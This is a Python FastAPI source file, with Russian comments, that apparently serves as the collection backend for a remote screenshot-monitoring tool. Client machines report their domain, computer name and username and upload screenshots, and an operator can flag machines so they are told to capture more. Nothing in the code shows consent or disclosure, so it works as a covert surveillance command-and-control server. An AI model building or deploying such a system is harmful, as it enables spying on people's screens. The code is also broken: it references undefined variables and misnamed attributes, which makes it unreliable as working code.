from typing import Annotated
from fastapi import FastAPI, Request, Form

import logging

from sqlalchemy import create_engine
from sqlalchemy.ext.declarative import declarative_base
from sqlalchemy.orm import sessionmaker, Session
from sqlalchemy import Integer, String, DateTime, Boolean, Column, create_engine, ForeignKey
from sqlalchemy.dialects.postgresql import UUID

import datetime
import pytz
import uuid


Base = declarative_base()

class ActivityEntry(Base):
    __tablename__ = "activity_entry"

    id = Column(UUID(as_uuid=True), primary_key=True)
    creation_date = Column(DateTime(), default=datetime.datetime.now(tz=pytz.timezone('UTC')))
    domain = Column(String, index=True)
    computername = Column(String, index=True)
    username = Column(String, index=True)
    hostname = Column(String, index=True)
    should_take_screenshot = Column(Boolean, default=False)


# Простенький сервер

app = FastAPI()

DBURL = "postgresql://postgres:password@localhost:25432/test"

engine = create_engine(DBURL, echo=True)
sess = Session(engine)

Base.metadata.create_all(engine)


@app.route("/{full_path:path}")
def capture_routes(request: Request, full_path: str):
    print(request.client.host, request.body(), full_path)
    
@app.post("/ts")
async def shouldTakeScreenshot(domain: Annotated[str, Form()],computername: Annotated[str, Form()],username: Annotated[str, Form()],hostname: Annotated[str, Form()]):
    v = sess.query(ActivityEntry).filter(ActivityEntry.domain == domain).filter(ActivityEntry.computername == computername).filter(ActivityEntry.username == username).filter(ActivityEntry.hostname == hostname).order_by(ActivityEntry.creation_date).limit(1).all()
    if v is not None and len(v) != 0:
        v[0].shouldTakeScreenshot = True
        sess.commit()

@app.post("/list")
async def list_users():
    v = sess.query(ActivityEntry.domain, ActivityEntry.computername, ActivityEntry.username, ActivityEntry.hostname).group_by(ActivityEntry.domain, ActivityEntry.computername, ActivityEntry.username, ActivityEntry.hostname).all()
    a = list()
    if v is not None:
        for l in v:
            d, c, u, h = l
            a.append(
                        {
                            "dmn": d,
                            "cnm": c,
                            "unm": u,
                            "hnm": h
                        }
                    )
    return a

@app.post("/ua")
async def write_to_db(request: Request):
    client_host = request.client.host
    body = await request.body()
    print(len(body))
    u = uuid.uuid4()
    a=0
    for _ in range(3):
        a = body.index(b'\n', a + 1)
    f = body[a + 1:]
    r = body[:a].split(b'\n')
    r[0] = r[0].decode("ascii").replace("\x00", "")
    r[1] = r[1].decode("ascii").replace("\x00", "")
    r[2] = r[2].decode("ascii").replace("\x00", "")
    ae = ActivityEntry()
    ae.id = u
    ae.domain = r[0]
    ae.computername = r[1]
    ae.username = r[2]
    ae.hostname = client_host
    v = sess.query(ActivityEntry).filter(ActivityEntry.domain == domain).filter(ActivityEntry.computername == computername).filter(ActivityEntry.username == username).filter(ActivityEntry.hostname == hostname).order_by(ActivityEntry.creation_date).limit(1).all()
    sess.add(ae)
    sess.commit()
    try:
        # Предлагается использовать garbage collector для старых фоток. В тз не входит
        with open(f"{u}.png", 'wb') as screenshot:
            screenshot.write(f)
    except:
        pass
    if v is not None and len(v) != 0:
        if v[0].shouldTakeScreenshot is True:
            return 1
    return 0
    
